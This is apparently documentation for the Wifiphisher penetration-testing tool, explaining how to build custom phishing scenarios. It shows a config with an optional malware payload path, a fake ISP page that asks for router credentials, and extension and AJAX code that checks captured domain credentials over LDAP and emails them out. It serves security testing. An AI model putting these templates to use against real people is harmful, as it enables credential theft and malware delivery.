Creating a custom phishing scenario
===================================

For specific target-oriented attacks, creating a custom Wifiphisher phishing scenario may be necessary. For example, during a penetration testing, it may be necessary to capture the domain credentials using a phishing page with a familiar (to the victim users) interface, then verify the captured credentials over a local LDAP server and finally deliver them via SMTP to a mail server that we own.

Creating a phishing scenario is easy and consists of two steps:

1) Creating the config.ini
--------------------------

A config.ini file lies in template's root directory and its contents can be divided into two sections:

* info: This section defines the scenario's characteristics.
* Name (mandatory): The name of the phishing scenario
* Description (mandatory): A quick description (<50 words) of the scenario
* PayloadPath (optional): If the phishing scenario pushes malwares to victims, users can insert the absolute path of the malicious executable here
* context: This section is optional and holds user-defined variables that may be later injected to the template.


Here's an example of a config.ini file:


.. code:: text

        > # This is a comment
        > [info]
        > Name: ISP warning page
        > Description: A warning page from victim's ISP asking for DSL credentials
        >
        > [context]
        > victim_name: John Phisher
        > victim_ISP: Interwebz


2) Creating the template files
------------------------------

The template files lie under the html directory and contain the static parts of the desired HTML output. They may consist of several static HTML files, images, CSS or Javascript files. Dynamic languages (e.g. PHP) are not supported.

The HTML files may also contain some special syntax (think placeholders) describing how dynamic content will be inserted. The dynamic contect may originate from two sources:

1) Beacon frames.

Beacon frames contain all the information about the target network and can be used for information gathering. The main process gathers all the interesting information and passes them to the chosen template on the runtime.

At the time of writing, the main process passes the following data: 
    * target_ap_essid <str>: The ESSID of the target Access Point
    * target_ap_bssid <str>: The BSSID (MAC) address of the target Access Point
    * target_ap_channel <str>: The channel of the target Access Point
    * target_ap_vendor <str>: The vendor's name of the target Access Point
    * target_ap_logo_path <str>: The relative path of the target Access Point vendor's logo in the filesystem
    * APs <list>: A list containing dictionaries of the Access Points captured during the AP selection phase
    * AP <dict>: A dictionary holding the following information regarding an Access Point: 
        * channel <str>: The channel of the Access Point
        * essid <str> The ESSID of the Access Point
        * bssid <str> The BSSID (MAC) address of the Access Point
        * vendor <str> The vendor's name of the Access Point

Note that the above values may be 'None' accordingly. For example, all the target_* values will be None if there user did not target an Access Point (by using --essid option). The 'target_ap_logo_path' will be None if the logo of the specific vendor does not exist in the repository.

2) config.ini file (described above).

All the variables defined in the "Context" section may be used from within the template files. In case of naming conflicts, the variables from the configuration file will override the variables coming from the beacon frames.

Here's a snippet from an example template (index.html):

.. code:: html

 <p> Dear {{ victim_name }}, This is a message from {{ ISP }}.
 A problem was detected regarding your {{ target_ap_vendor }} router. </p>
 <p> Please write your credentials to re-connect over PPPOE/PPPOA.</p>
 <input type="text" name="wphshr-username"></input>
 <input type="text" name="wphshr-password"></input>

In this example, 'victim_name' and 'ISP' variables come from config.ini, while
'target_ap_vendor' variable comes from the beacon frames. While all POST values
are logged by Wifiphisher by default, those that indicate that they include
passwords or usernames are marked as "credentials". In this case, both
"wphshr-username" and "wphshr-password" are credentials and will be printed
after a succesfull attack.

There are cases where dynamic rendering is necessary for the phishing page. For
example, in order to make the above ISP scenario more realistic we can have the
number of connected stations printed somewhere. In order to dynamically adjust
the page upon render with the number of connected devices, a special
Wifiphisher extension needs to be created. There, we will declare a uimethod as following.


.. code:: python

  @uimethods.uimethod
  def get_connected_devices(self, data):
      return len(data.connected_devices)

Now, we can call this method through our phishing page as following:

.. code:: html

  <p>Number of connected devices: <b>{{ get_connected_devices() }}</b></p>

These are also cases where we need to process input from the victim user, for
example, to verify that the supplied credentials are valid or to send an email
with the captured data. In these cases a Wifiphisher extension with a special
backend function is required.

Let's say that we want to verify that the supplied domain credentials are
correct over an LDAP server. Our Wifiphisher extension should contain the following method.

.. code:: python

        @extensions.register_backend_funcs
            def ldap_verify(self, *list_data):
               if self.check_creds_over_ldap(list_data):
                   self.send_mail_with_creds(list_data)
                   return 'success'
               return 'fail'

Now we can verify that the captured credentials are valid with the use of AJAX.

.. code:: javascript

                 var data =
                 {
                     "ldap_verify": input.value // captured creds
                 };
                 var dataToSend = JSON.stringify(data);
                 // post the data
                 $.ajax(
                     {
                         url: '/backend/',
                         type: 'POST',
                         data: dataToSend,

                         success: function (jsonResponse) {
                             var objresponse = JSON.parse(jsonResponse);
                             var verify_status = objresponse['ldap_verify']
                             if (verify_status == 'success') {
                                // Print Success Message
                             } else if (verify_status == 'fail') {
                                // Credentials are invalid. Ask the victim user again.
                             }
                        }
                     }
                  );


Any request to the /backend/ handler will be processed by all extensions that
have registered a backend method. It's the extension's responsibility to figure
out if the submitted data was intended for itself and not for another extension.

That's it! For a full example, it is recommended to go through the code of
Wifiphisher extension "pskverify" that verifies the validity of a captured
Pre-Shared Key over a network dump that contains the four-way handshake. This
extension is leveraged by scenarios that aim to capture the PSK of a WPA/WPA2
WLAN, such as the "wifi_connect" and "firmware-upgrade" scenarios.
